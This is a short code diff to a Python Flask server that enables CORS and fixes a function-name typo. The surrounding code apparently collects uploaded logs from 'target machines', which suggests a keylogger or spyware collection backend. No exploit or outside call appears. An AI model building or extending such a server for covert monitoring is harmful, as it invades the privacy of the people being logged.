@@ -1,9 +1,11 @@
 import os
 import time
 from flask import Flask, request, jsonify
+from flask_cors import CORS
 import Encryptor as enc
 
 app = Flask(__name__)
+CORS(app)
 DATA_FOLDER = "data"
 
 def generate_log_filename():
@@ -34,7 +36,7 @@ def upload():
 
     return jsonify({"status": "success", "file": file_path}), 200
 @app.route('/api/get_target_machines_list', methods=['GET'])
-def get_targget_machines_list():
+def get_target_machines_list():
     """Returns a list of all machines that have logged data"""
     machines = os.listdir(DATA_FOLDER)
     return jsonify({"machines": machines})
